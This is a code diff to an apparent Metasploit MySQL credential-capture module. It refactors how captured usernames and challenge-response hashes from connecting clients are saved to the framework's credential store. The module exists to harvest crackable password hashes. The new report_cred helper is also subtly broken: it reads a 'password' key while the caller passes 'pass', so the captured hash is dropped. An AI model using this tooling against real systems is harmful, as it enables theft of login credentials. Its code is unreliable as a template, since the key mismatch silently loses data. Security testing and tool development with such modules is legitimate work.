@@ -128,6 +128,32 @@ class Metasploit3 < Msf::Auxiliary
     c.put data
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def on_client_data(c)
     info = { :errors => [] }
     data = c.get_once
@@ -144,16 +170,14 @@ class Metasploit3 < Msf::Auxiliary
         print_status("#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}")
       end
       hash_line = "#{info[:username]}:$mysql$#{@challenge.unpack("H*")[0]}$#{info[:response].unpack('H*')[0]}"
-      report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'mysql_client',
-        :user => info[:username],
-        :pass => hash_line,
-        :type => "mysql_hash",
-        :proof => info[:database] ? info[:database] : hash_line,
-        :source_type => "captured",
-        :active => true
+
+      report_cred(
+        ip: c.peerhost,
+        port: datastore['SRVPORT'],
+        service_name: 'mysql_client',
+        user: info[:username],
+        pass: hash_line,
+        proof: info[:database] ? info[:database] : hash_line
       )
 
       if (datastore['CAINPWFILE'])
